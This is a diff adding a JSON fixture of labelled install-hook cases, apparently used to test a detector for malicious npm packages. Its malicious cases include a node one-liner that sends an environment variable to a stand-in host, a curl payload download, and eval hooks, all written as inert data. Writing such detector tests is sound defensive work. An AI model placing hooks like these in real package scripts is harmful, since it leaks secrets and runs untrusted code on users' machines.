@@ -1,0 +1,21 @@
+{
+  "cases": [
+    {"id": "existing-network", "label": "malicious", "description": "Existing inline network/environment hook", "script": "node -e \"fetch('https://invalid.example', {body: process.env.DUMMY})\""},
+    {"id": "existing-eval", "label": "malicious", "description": "Existing inline dynamic-code hook", "script": "node -e \"eval('dummy')\""},
+    {"id": "existing-shell", "label": "malicious", "description": "Existing shell download hook", "script": "curl https://invalid.example/payload"},
+    {"id": "fresh-inline", "label": "malicious", "description": "New inline suspicious hook, visible only after install", "script": "node -e \"eval('dummy')\""},
+    {"id": "slow-phantom", "label": "malicious", "description": "Package file created, held for 0.8 s, then deleted"},
+    {"id": "root-executable", "label": "malicious", "description": "Executable persisted directly in project root"},
+    {"id": "fast-phantom", "label": "malicious", "description": "Package file created and immediately deleted between polls"},
+    {"id": "nested-executable", "label": "malicious", "description": "Executable persisted in a project subdirectory"},
+    {"id": "helper-script", "label": "malicious", "description": "New hook invokes a helper containing inert suspicious source", "script": "node install.js"},
+    {"id": "clean", "label": "benign", "description": "No filesystem changes"},
+    {"id": "persistent-package", "label": "benign", "description": "Ordinary package files persist in node_modules"},
+    {"id": "existing-cleanup", "label": "benign", "description": "Installer removes a file that predates the install"},
+    {"id": "native-persistent", "label": "benign", "description": "Real C compilation leaves its executable inside the package", "compiler": true},
+    {"id": "native-temp", "label": "benign", "description": "Real C compilation cleans a temporary object after 0.8 s", "compiler": true},
+    {"id": "native-temp-allowed", "label": "benign", "description": "Same C build cleanup with explicit package allowlisting", "compiler": true, "allow": true},
+    {"id": "native-spawn", "label": "benign", "description": "Legitimate native-build hook references child_process", "script": "node -e \"require('child_process').spawnSync('cc')\"", "compiler": true},
+    {"id": "native-spawn-allowed", "label": "benign", "description": "Same native-build hook with explicit package allowlisting", "script": "node -e \"require('child_process').spawnSync('cc')\"", "compiler": true, "allow": true}
+  ]
+}
